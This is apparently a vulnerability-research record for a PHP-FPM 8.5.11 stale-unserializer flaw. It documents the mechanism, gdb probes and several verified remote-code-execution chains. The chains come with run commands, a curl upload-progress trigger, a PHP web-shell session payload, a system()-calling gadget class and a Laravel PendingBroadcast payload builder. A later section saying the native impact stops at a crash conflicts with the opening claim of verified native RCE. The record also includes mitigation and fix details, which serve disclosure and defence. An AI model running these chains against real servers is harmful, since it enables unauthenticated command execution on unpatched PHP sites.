# php2shell on PHP-FPM 8.5.11 — stale unserializer state

Status: **native no-gdb RCE verified (Round 37).** A minimal two-page app plus
stock PHP-FPM (one worker) is enough to leave a dangling
`php_unserialize_data` in the Basic globals with request A and to reuse it from
the session upload-progress handler in request B. Request B's multipart bodies
reclaim the freed struct; a 4096-byte file-part name turns the stale pointers
into `var_tmp_var()` dereferences of attacker-influenced values and the worker
dies with SIGSEGV.

Measured: **5/5 SIGSEGV on freshly started workers** (container restart before
each attempt), plus a 6th in the packaged runner. A respawned worker can have a
different large-page free-list layout; immediate retries after a crash missed
the reclaim in 2/2 observed cases. This is heap-layout dependence, not a
different code path.

This is the FPM counterpart of the mod_php chain in `../off_chain/`. The
crash-era history below explains the primitive. The native chain is in
`../HANDOFF.md` and `../progress.md` Round 37:
`MODE=nogdb IMAGE=php:8.5.11-fpm SESS_MODE=nogdb bash fpm/run_native.sh`
returns `uid=33(www-data)` with ASLR on and stock `php.ini-production`. The
4-worker pool uses `POOL_CONF=zz-multi.conf PINS=3` and `PRE=25500`; three
truncated FastCGI records pin the other workers (5/5).

With gdb placing the fake `execute_data` and `pDestructor` (the post-leak half),
the same worker runs `system()`: `./fpm/run_fire4.sh` returns
`uid=33(www-data)`, 3/3. The leak and the native frame are in `../HANDOFF.md` and
`../progress.md` Round 37.

```
$ RESTART=1 CONTAINER=p2s-fpm ./fpm/run_fpm_repro.sh 9001
[1/4] S1: session record = 1.19 MB serialized array
[2/4] S2: session record = one integer (the value written at the slot)
[3/4] A: session_start() decode OOM (stale BG(unserialize))
      A http=500 (expect 500)
[4/4] B: upload-progress + 16 x 4096-byte file names
HTTP/1.1 502 Bad Gateway
      signal-11 log entries: 6 -> 7
RESULT: FPM worker SIGSEGV (stale unserialize state reused)
```

## Requirements

| Item | Value |
|---|---|
| PHP | 8.5.11 (vulnerable); fixed in 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 |
| SAPI | PHP-FPM, `pm.max_children = 1` (`fpm/zz-single.conf`) |
| INI | stock `php.ini-production`; `session.upload_progress.enabled=On` (default), `session.use_strict_mode=0`, `session.save_path=/tmp` |
| App | `www/fpm_sess.php`, `www/fpm_sess_oom.php`, `www/index.php` |
| Client | `curl`, `python3` (no gdb needed for the crash) |

Target files are the only target-side additions; the app pages are plain PHP.
`www/index.php` is the upload-progress endpoint and is `<?php echo "OK\n";` —
no application code runs in request B before the crash.

## Mechanism (8.5.11)

Startup order in `main/main.c`:

```
PG(modules_activated) = 0;
zend_activate();
php_hash_environment();     /* POST parse -> rfc1867 -> session decode */
zend_activate_modules();    /* Basic RINIT: memset(&BG(unserialize), 0, ...) */
PG(modules_activated) = 1;
```

`php_var_unserialize_init()` publishes its bookkeeping in the Basic globals:

```c
if (BG(serialize_lock) || !BG(unserialize).level) {
    d = emalloc(sizeof(struct php_unserialize_data));
    ...
    if (!BG(serialize_lock)) {
        BG(unserialize).data = d;
        BG(unserialize).level = 1;
    }
} else {
    d = BG(unserialize).data;
    ++BG(unserialize).level;
}
```

On the official `php:8.5.11-fpm` binary (NTS, Debian trixie):

```
basic_globals + 0x350  BG(serialize_lock)        (uint32)
basic_globals + 0x368  BG(unserialize).data      (pointer)
basic_globals + 0x370  BG(unserialize).level     (uint32)
sizeof(struct php_unserialize_data) = 0x2018      (3 pages, measured in the binary)
sizeof(var_dtor_entries)            = 0x1000      (2 pages)
```

Request A (`/fpm_sess_oom.php`):

```php
ini_set('memory_limit', '4M');
session_start();
```

The session record is a 1.19 MB serialized array of 100000 ints, built through
`fpm_sess.php`. `session_start()` -> `php_session_initialize()` ->
`ps_srlzr_decode_php()` -> `php_var_unserialize_init()` publishes `d`; the
serializer then calls `var_tmp_var()` for the session variable (allocating the
`var_dtor_entries` block at `d + 0x3000`), and the array decode OOMs at
`zend_hash_real_init_mixed`. `php_session_decode()`'s `zend_catch` runs
`php_session_cancel_decode()` and re-bails; `php_var_unserialize_destroy()` is
never reached, so `BG(unserialize).level` stays 1 and `.data` stays dangling.
The fatal happens after `php_request_startup()` succeeded, so FPM keeps the
worker (unlike a startup failure, which makes FPM exit the worker).

Request B is a multipart POST to `/index.php` with a `PHPSESSID` cookie for a
second session and a `PHP_SESSION_UPLOAD_PROGRESS` field. The file part makes
`rfc1867.c` call `MULTIPART_EVENT_FILE_START`, which sets
`PS(id) = progress->sid` and calls `php_session_rfc1867_update()` ->
`php_session_initialize()` -> the session decode. That runs inside
`php_hash_environment()`, before Basic's RINIT, so
`php_var_unserialize_init()` sees `level = 1` and returns the dangling `d`.

## Probe evidence

`probe-unser.gdb` runs `php-fpm -F` under gdb and reads the three globals. With
`session_start()` as request A:

```
BAILOUT level=1 data=0x...a7f000 dtor=0x...a82000 used=1
#0 _zend_bailout
#3 zend_hash_real_init_mixed

INIT lock=0 level=1 data=0x...a7f000
0x...a7f000: last=0x...a7f038  first_dtor=0x...a82000  last_dtor=0x...a82000
#0 php_var_unserialize_init
#1 ps_srlzr_decode_php
...
```

`d` and its destructor block are adjacent and both freed at request shutdown,
so they coalesce into one 5-page run. Request B's allocations split that run
from the front. A 4096-byte file-part name is materialized as a `zend_string`
(`$_FILES[...]['name']`) and, in the crashing runs, lands at `d`:

```
INIT lock=0 level=1 data=0x...27f000
0x...27f000: 0x0000001600000001 0x0000000000000000
0x...27f010: 0x0000000000001000 0xfffffffffffffffe
```

The first 0x18 bytes are the `zend_string` header (gc / hash / len), so
`d->last` becomes `0x0000001600000001` and `d->last_dtor` becomes the length
`0x1000`. The next session decode calls `var_tmp_var()`, which dereferences
`last_dtor`:

```
Thread 2.1 "php-fpm" received signal SIGSEGV, Segmentation fault.
0x... in var_tmp_var ()
#0 var_tmp_var
#1 ps_srlzr_decode_php
...
#5 rfc1867_post_handler
#6 sapi_handle_post
#7 php_default_treat_data
```

FPM logs `child N exited on signal 11 (SIGSEGV)` and the master starts a
replacement.

## Fixed control

The same runner against the stock `php:8.5.12-fpm` image, same app and
single-worker pool:

```
[3/4] A: session_start() decode OOM (stale BG(unserialize))
      A http=200 (the OOM no longer bails out of the decode)
[4/4] B: upload-progress + 16 x 4096-byte file names
      HTTP/1.1 200 OK
      signal-11 log entries: 0 -> 0
```

8.5.12 adds `php_basic_early_rinit()` (memset of `BG(serialize)` /
`BG(unserialize)` before request parsing) and replaces OOM bailouts with
UnwindExit, so neither half of the chain survives.

## gdb-assisted `zif_system` call (Round 16)

`run_fire4.sh` closes the call half of the chain without touching the live
session array early. After the B's session decode, `zend_array_destroy()` is
entered on `PS(http_session_vars)`. The probe stops at entry, sets
`pDestructor = zif_system`, and writes a fake `zend_execute_data` at bucket 0:

```
FLUSH ht=...c2d8 ar=...67c0 n=2 nt=8 pd=zval_ptr_dtor
ADEST ht=...c2d8 n=2
FRAME array_destroy ... q2c=0x1 q50=...6890 q58=0x6
DESTHT ht=...c2d8 pd=zif_system
SYSE e=...67c0 na=1 arg0=...6890 at=6
[Detaching after vfork from child process 21]
```

`/tmp/fpm5_proof` = `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.
The destructor only sets rdi; `return_value` (= rsi) is NULL, so one run
SIGSEGVs in `php_exec` after the command and FPM respawns the worker.

The frame must be written at destroy entry, not at `php_session_flush`: the
session array is still encoded afterwards, and `num_args = 1` at frame `+0x2C`
overlaps bucket 1's hash chain link (`val.u2.next`), which makes
`zend_hash_find()` self-loop in `php_get_session_var()`. `zend_array_destroy()`
only routes through `zend_hash_destroy()` when `pDestructor != ZVAL_PTR_DTOR`,
so the destructor is swapped at its entry. Fast parameter parsing reads
`EX_NUM_ARGS()` and arg 1 from the handler's `execute_data` (rdi); arg 1 is at
`+0x50` (`ZEND_CALL_FRAME_SLOT = 5`), and the bucket val type at `+0x08` must be
non-`IS_UNDEF`.

The native chain still needs a leak: the reclaiming file-name `zend_string`
header covers `d + 0x00..0x17`, so `d->last_dtor` is the string length and
attacker bytes start at `d + 0x18`. The probe patches `d` under gdb.

## Why this stops at a crash

The calif write-up describes a stronger primitive: reclaim a
`var_dtor_entries` block, set its signed `used_slots` negative, and have
`tmp_var()` copy a decoded zval to `block + 16 + 16 * used_slots`. On the
vulnerable 8.5.11 source that arithmetic is:

```c
var_hash = (*var_hashx)->last_dtor;
if (!var_hash || var_hash->used_slots + num > VAR_DTOR_ENTRIES_MAX) { ... }
for (used_slots = var_hash->used_slots; var_hash->used_slots < used_slots + num; var_hash->used_slots++) {
    ZVAL_UNDEF(&var_hash->data[var_hash->used_slots]);
    Z_EXTRA(var_hash->data[var_hash->used_slots]) = 0;
}
return &var_hash->data[used_slots];
```

Reaching it here is blocked by two properties of this minimal trigger:

1. `d` and the first dtor block are allocated back-to-back and coalesce when
   the request heap is freed. Any large allocation that reclaims the 2-page
   dtor block splits the run from the front and overwrites `d` first, which
   destroys the only pointer (`d->last_dtor`) to that block. Our 16 x 4096-byte
   spray does exactly that: the run is entered at `d`, not at the dtor block.
2. A `zend_string` reclaim of `d` leaves attacker bytes only from offset
   `0x18`. The header fields that `php_unserialize_data` reads as `last`,
   `first_dtor`, and `last_dtor` are engine-written and are not valid pointers
   or attacker-chosen addresses.

Turning the primitive into a controlled slot write needs the dtor block
reclaimed while `d`'s stale pointers stay valid, which in turn needs either a
heap/libphp address leak or a layout where `d` and the dtor block do not
coalesce (for example an application allocation that stays live between them).
That is the "application-dependent" part of the advisory. No leak sink exists
in the minimal page used here (`<?php echo "OK\n";`); the native FPM impact is
therefore an unauthenticated worker crash, not code execution. The gdb-assisted
section above shows that once the addresses are known, the same primitive calls
`zif_system` and runs a command; the open problem is the leak, not the call.

## gdb probe

```sh
docker run -d --name p2s-fpm --network p2s-fpm-net \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/fpm/zz-single.conf:/usr/local/etc/php-fpm.d/zz-single.conf:ro" \
  -v "$PWD/fpm/probe-unser.gdb:/tmp/fpm-probe.gdb:ro" \
  p2s-fpm-gdb:8511 \
  gdb -q -batch -x /tmp/fpm-probe.gdb --args /usr/local/sbin/php-fpm -F
docker exec p2s-nginx nginx -s reload
```

`p2s-fpm-gdb:8511` is the official `php:8.5.11-fpm` image plus gdb/procps. The
probe follows the pool child (`follow-fork-mode child`), logs to
`/tmp/fpm-probe.log`, and prints the globals at `php_var_unserialize_init`,
`php_var_unserialize_destroy`, and `_zend_bailout`.

## Mitigation

- Upgrade to a fixed release. 8.5.12 adds `php_basic_early_rinit()`, which
  memsets `BG(serialize)`/`BG(unserialize)` in `php_request_startup()` before
  `php_hash_environment()`, so the startup-time session decode can no longer
  reuse state from a previous request (`commit 31c0ea7d7ff`, GHSA-6wmf-4rv5-p3rp
  / CVE-2026-109619).
- Partial FPM mitigation from the advisory: `session.upload_progress.enabled=0`
  removes the pre-RINIT session consumer. `memory_limit=-1` removes the OOM
  trigger but is not recommended as a primary control.

## Handler-mismatch chain: session-confusion primitive, not a php2shell RCE

Correction: this chain does not show that php2shell makes a typical FPM target
remotely exploitable. It requires a per-directory `session.serialize_handler`
mismatch (configuration) and an application gadget class whose destructor
performs the useful action. The `Evil` class below is a contrived lab gadget
that calls `system($cmd)`; a real target needs an application POP chain. The
chain demonstrates the session-confusion primitive and its survival on 8.5.12;
it is excluded from the php2shell risk verdict.

Technical record: a write directory uses
`session.serialize_handler=php_serialize`; a read directory uses `php` and
defines a gadget class with `__destruct`. The raw
`PHP_SESSION_UPLOAD_PROGRESS` value is stored inside the session file; the `php`
reader splits at the `|` inside that string, unserializes the `Evil` object,
fails on the trailing data, and destroys the object.

Files:

```
www/chainW/.user.ini   session.serialize_handler=php_serialize
www/chainW/up.php      write endpoint
www/chainR/.user.ini   session.serialize_handler=php
www/chainR/class.php   Evil::__destruct -> system($cmd)
www/chainR/read.php    require class.php; session_start()
fpm/chain_c.py         single-worker, cleanup=0 variant
fpm/chain_c_stall.py   default-cleanup stall variant (2 workers)
fpm/zz-multi.conf      pm.max_children=2
```

Single worker, `session.upload_progress.cleanup=0` in `chainW/.user.ini`:

```
$ python3 fpm/chain_c.py 9001 id
[1] write: HTTP/1.1 200 OK
[2] read: HTTP/1.1 200 OK
38
uid=33(www-data) gid=33(www-data) groups=33(www-data)
R
0
```

Default `cleanup=On`, two workers, `fastcgi_request_buffering off` in
`fpm/nginx.conf`:

```
$ python3 fpm/chain_c_stall.py 9001 id
HTTP/1.1 200 OK
38
uid=33(www-data) gid=33(www-data) groups=33(www-data)
R
0
```

The write is a partial multipart body (progress field plus the file-part
headers) held open; FPM writes the progress record at `FILE_START`, and the
second worker serves the read before `END` cleanup removes it. The simple
two-request sequence fails with `cleanup=On` (no `uid` output).

Both `php:8.5.11-fpm` and `php:8.5.12-fpm` return the `id` output. The 8.5.12
memory patch does not close this chain: the read is an application
`session_start()`, not the pre-RINIT upload-progress update that the fix's
incomplete-class mode covers.

Conditions: a per-directory serialize-handler mismatch, a gadget class with a
useful destructor (application code), and either `cleanup=0` or a stalled upload
with request buffering off. This is separate from the `BG(unserialize)` memory
bug and is not counted as a php2shell FPM RCE.

## Progress-value injection + include sink: LFI composition, not a php2shell RCE

Correction: `www/view.php` is intentionally vulnerable application code: it
`include`s `$_GET['tpl']`. An application with that LFI is already exploitable;
upload_progress only writes a PHP payload into a file the LFI can include. This
does not demonstrate php2shell exploitability and is excluded from the risk
verdict.

Technical record: the raw `PHP_SESSION_UPLOAD_PROGRESS` value becomes the session key
`upload_progress_<?php system($_GET['c']); ?>`, which the session file stores
verbatim. Including `/tmp/sess_<sid>` executes it.

With `session.upload_progress.cleanup=0` in `chainW/.user.ini` (single worker,
regular complete upload):

```
$ python3 fpm/chain_a.py 9001 id
[1] write: HTTP/1.1 200 OK
[2] include: HTTP/1.1 200 OK
a:1:{s:44:"upload_progress_uid=33(www-data) gid=33(www-data) groups=33(www-data)
";a:5:{...}}
```

The command output appears inside the included serialized record. The
default-cleanup stall variant raced `END` cleanup for this include path in the
lab; the handler-mismatch stall variant is the verified default-cleanup RCE.

Conditions: an application include/LFI sink (the `view.php` pattern) and
`cleanup=0`, or the stalled-upload timing for default cleanup. The LFI exists
independently of php2shell; this chain is not php2shell RCE evidence.

## Pre-RINIT session gadget: verified FPM RCE on 8.5.11, blocked in 8.5.12

The upload-progress handler decodes the session before RINIT. In 8.5.11 that
decode resolves classes and runs magic methods. A preloaded class with
`__wakeup` executes during any multipart upload-progress request: no
`session_start()` in the target script and no handler mismatch are needed.

Setup:

```
fpm/php-preload.ini      opcache.enable=1
                         opcache.preload=/var/www/html/preload.php
                         opcache.preload_user=www-data
www/preload.php          class Evil { public $cmd; __wakeup() { system($this->cmd); } }
www/preload_store.php    session_start(); $_SESSION['x'] = new Evil($_POST['cmd']);
```

The app stores the object once; the attacker then sends a multipart request
with the session ID and `PHP_SESSION_UPLOAD_PROGRESS` to any endpoint:

```
curl -b PHPSESSID=<sid> -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
     -F f=@small.bin http://127.0.0.1:9001/index.php
```

8.5.11:

```
$ docker exec p2s-fpm cat /tmp/preproof
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

8.5.12 with the same session file and request: no execution, no proof file. The
incomplete-class mode keeps the object as `__PHP_Incomplete_Class` during the
pre-RINIT update (`rfc1867_no_user_code.phpt` is the fix's test).

Conditions: a preloaded class with a magic method reachable from
attacker-influenced session data (the application's POP chain), and an app that
stores an object of that class in the session. The trigger is core PHP and is
fixed in 8.5.12; the gadget and the stored object are application code. This is
distinct from the post-RINIT serialize-handler chain above: it needs no
per-directory handler mismatch and no app `session_start()`.

## Handler-mismatch write + pre-RINIT wakeup: FPM RCE without an app store

Status: verified FPM RCE on 8.5.11 with no application session store and no
`session_start()` in any target page; blocked in 8.5.12.

The write endpoint lives in a directory whose `.user.ini` sets
`session.serialize_handler=php_serialize` (the same mismatch used by
`chain_c`). The attacker puts `x|O:4:"Evil":...` into
`PHP_SESSION_UPLOAD_PROGRESS`; the raw key is stored verbatim in the session
file. The write body is held open at FILE_START so the default `cleanup=On`
END does not remove it (two workers + `fastcgi_request_buffering off`, or
`cleanup=0`). The read is a second upload-progress request to a
`php`-handler directory whose page is `<?php echo "OK\n";` — no
`session_start()`, no app code. The pre-RINIT session decode splits the raw key
at the `|`, unserializes `Evil`, and runs `__wakeup` before RINIT.

Files: `fpm/chain_e2.py`, `www/chainW/up.php` (php_serialize side),
`www/chainR/plain.php` (php side, no session_start), preloaded
`www/preload.php`, `fpm/php-preload.ini`, `fpm/zz-multi.conf`.

```
docker run -d --name p2s-fpm --network p2s-fpm-net \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/fpm/php-preload.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/fpm/zz-multi.conf:/usr/local/etc/php-fpm.d/zz-single.conf:ro" \
  p2s-fpm-gdb:8511 /usr/local/sbin/php-fpm -F
docker exec p2s-nginx nginx -s reload
python3 fpm/chain_e2.py 9001 'id > /tmp/preproof3'
docker exec p2s-fpm cat /tmp/preproof3
```

Measured: 3/3 on fresh 8.5.11 workers:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

8.5.12: no proof file; the read logs `Failed to decode session object. Session
has been destroyed` (the incomplete-class mode blocks the pre-RINIT user-code
decode).

Conditions: a per-directory serialize-handler mismatch (configuration), a
preloaded class with a magic method (the application's POP chain), two workers
and request buffering off for default cleanup. The attacker supplies the
serialized object through the write endpoint; the application does not need to
store it. This is the CVE-2026-109619 pre-RINIT decode; 8.5.12 blocks it. It is
distinct from the post-RINIT `chain_c` app chain, which still runs on 8.5.12 and
is not php2shell RCE evidence.

## Common-framework gadget: Laravel PendingBroadcast → Dispatcher → app listener

Status: verified FPM RCE on 8.5.11 with the real Composer-installed
`illuminate/broadcasting`, `illuminate/events`, and `illuminate/container`
classes; no proof on 8.5.12. This addresses the "system() in `__wakeup` is a
contrived gadget" objection: the magic method is Laravel's own
`PendingBroadcast::__destruct`, and the command runs in an application
listener, which is the app-dependent gadget the advisory implies.

Setup:

```
cd www
composer require illuminate/broadcasting illuminate/events
# vendor/ now contains the real framework classes
```

`www/preload.php` eagerly loads every class the chain touches at runtime
(`PendingBroadcast`, `Dispatcher`, `Container`, `Util`,
`ContextualAttribute`, `Arr`, `Str`, the app listener `Evil`); `opcache.preload`
points at it via `fpm/php-preload.ini`. The eager loads matter because the
per-request Composer autoloader is not active during the pre-RINIT decode.

`www/mk_laravel_payload.php` builds the serialized object:

```php
$d = new Illuminate\Events\Dispatcher(new Illuminate\Container\Container());
$d->listen('*', 'Evil@run');
echo serialize(new Illuminate\Broadcasting\PendingBroadcast($d, $cmd));
```

The read request uses the same `chainW` (php_serialize) → `chainR/plain.php`
(php, no session_start) pre-RINIT path. During the pre-RINIT decode the
`PendingBroadcast` is created; its `__destruct` calls
`Dispatcher::dispatch`, which resolves `Evil@run` through the `Container`; the
application's `Evil::run($cmd)` executes `system()`.

```
php www/mk_laravel_payload.php 'id > /tmp/preproof4' > /tmp/laravel_pb.payload
python3 fpm/chain_e3.py 9001 /tmp/laravel_pb.payload
docker exec p2s-fpm cat /tmp/preproof4
```

Measured:

```
8.5.11: uid=33(www-data) gid=33(www-data) groups=33(www-data)
8.5.12: no proof file; the pre-RINIT decode keeps the object incomplete
        (Failed to decode session object)
```

Files: `fpm/chain_e3.py`, `www/mk_laravel_payload.php`, `www/preload.php`,
`www/chainR/plain.php`, `www/chainW/.user.ini`, `www/chainR/.user.ini`, and
the `www/vendor` tree from Composer.

Conditions: the same per-directory handler mismatch and stalled write; a
preloaded class table containing the framework chain plus the application
listener. The framework classes and the `__destruct` are library code; the
final command lives in the application listener, so the real-world reach
depends on the target's own listener/gadget. The pre-RINIT trigger itself is
core PHP (CVE-2026-109619) and is blocked by 8.5.12.
